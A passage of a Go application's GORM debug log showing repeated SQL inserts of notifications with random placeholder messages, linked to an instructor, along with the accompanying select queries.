[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 20 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.764ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.579','2025-06-09 14:07:56.579',NULL,1,20) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.977ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.589','2025-06-09 14:07:56.589',NULL,'kuZlJdggqiHxYuWsklHK','system','2025-06-09 14:07:56.589',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.455ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.524ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 21 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.092ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.597','2025-06-09 14:07:56.597',NULL,1,21) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.196ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.603','2025-06-09 14:07:56.603',NULL,'zaOOiIANtTLtGdhksbNf','system','2025-06-09 14:07:56.603',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.662ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 22 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.330ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.613','2025-06-09 14:07:56.613',NULL,1,22) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.546ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.62','2025-06-09 14:07:56.62',NULL,'XUuAbuPFtmbIrdZhIkfZ','system','2025-06-09 14:07:56.62',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.483ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.446ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 23 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.069ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.627','2025-06-09 14:07:56.627',NULL,1,23) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.463ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.637','2025-06-09 14:07:56.637',NULL,'QFzAPGSlTplHDnfMdxRM','system','2025-06-09 14:07:56.637',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.490ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 24 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.840ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.644','2025-06-09 14:07:56.644',NULL,1,24) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.663ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.65','2025-06-09 14:07:56.65',NULL,'auhZiwPwWEvVyQLBnTjK','system','2025-06-09 14:07:56.65',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.468ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.177ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 25 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.954ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.663','2025-06-09 14:07:56.663',NULL,1,25) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.318ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.673','2025-06-09 14:07:56.673',NULL,'GQKwDMuFNyGrZCFKamat','system','2025-06-09 14:07:56.672',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.433ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.407ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 26 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.734ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.681','2025-06-09 14:07:56.681',NULL,1,26) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.807ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.687','2025-06-09 14:07:56.687',NULL,'wsujemcKjkVqaRYDNIUs','system','2025-06-09 14:07:56.687',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.436ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 27 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.125ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.696','2025-06-09 14:07:56.696',NULL,1,27) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.953ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.704','2025-06-09 14:07:56.704',NULL,'LUSUbHFGHPcxpdzKeNaz','system','2025-06-09 14:07:56.704',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.690ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.520ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 28 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.766ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.714','2025-06-09 14:07:56.714',NULL,1,28) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.005ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.722','2025-06-09 14:07:56.722',NULL,'TigOZmHFpxxhmJZMcJge','system','2025-06-09 14:07:56.722',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.451ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 29 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.073ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.729','2025-06-09 14:07:56.729',NULL,1,29) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.425ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.735','2025-06-09 14:07:56.735',NULL,'jhcKcHivTkgwdPMmzUFs','system','2025-06-09 14:07:56.735',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.449ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.419ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 30 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.799ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.744','2025-06-09 14:07:56.744',NULL,1,30) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.645ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.753','2025-06-09 14:07:56.753',NULL,'GrDgtJBLxhxxNQdoDwsn','system','2025-06-09 14:07:56.749',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.799ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.577ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 31 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[12.946ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.764','2025-06-09 14:07:56.764',NULL,1,31) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.073ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.772','2025-06-09 14:07:56.772',NULL,'vQgKEpaafWCwVwImGpxC','system','2025-06-09 14:07:56.772',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.442ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.469ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 32 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.173ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.783','2025-06-09 14:07:56.783',NULL,1,32) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.057ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.789','2025-06-09 14:07:56.789',NULL,'awvLerVtVbZaholHqoLP','system','2025-06-09 14:07:56.789',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.464ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 33 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.284ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.796','2025-06-09 14:07:56.796',NULL,1,33) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.301ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.802','2025-06-09 14:07:56.802',NULL,'bdtGWUbhpErIBKfjdGdJ','system','2025-06-09 14:07:56.802',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.436ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.449ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 34 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.364ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.811','2025-06-09 14:07:56.811',NULL,1,34) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.528ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.82','2025-06-09 14:07:56.82',NULL,'tWVKymkounywGQHHBXCF','system','2025-06-09 14:07:56.82',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.427ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.388ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 35 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.495ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.827','2025-06-09 14:07:56.827',NULL,1,35) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.561ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.838','2025-06-09 14:07:56.838',NULL,'izdpuRecWkusAqMyZGKu','system','2025-06-09 14:07:56.837',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 36 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.082ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.844','2025-06-09 14:07:56.844',NULL,1,36) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.591ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.851','2025-06-09 14:07:56.851',NULL,'sDNmLDLibldkYvbkEbuA','system','2025-06-09 14:07:56.851',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.397ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.402ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 37 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.620ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.859','2025-06-09 14:07:56.859',NULL,1,37) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.178ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.865','2025-06-09 14:07:56.865',NULL,'petUEMkyodshqjPKKVAm','system','2025-06-09 14:07:56.865',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.439ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 38 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.675ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.874','2025-06-09 14:07:56.874',NULL,1,38) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.772ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.88','2025-06-09 14:07:56.88',NULL,'YIiFPoKExWQrYEQOoPto','system','2025-06-09 14:07:56.88',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.249ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.552ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 39 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.474ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.888','2025-06-09 14:07:56.888',NULL,1,39) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.536ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.897','2025-06-09 14:07:56.897',NULL,'OYMvajuDthdJKphmCqBD','system','2025-06-09 14:07:56.897',false) RETURNING "id"

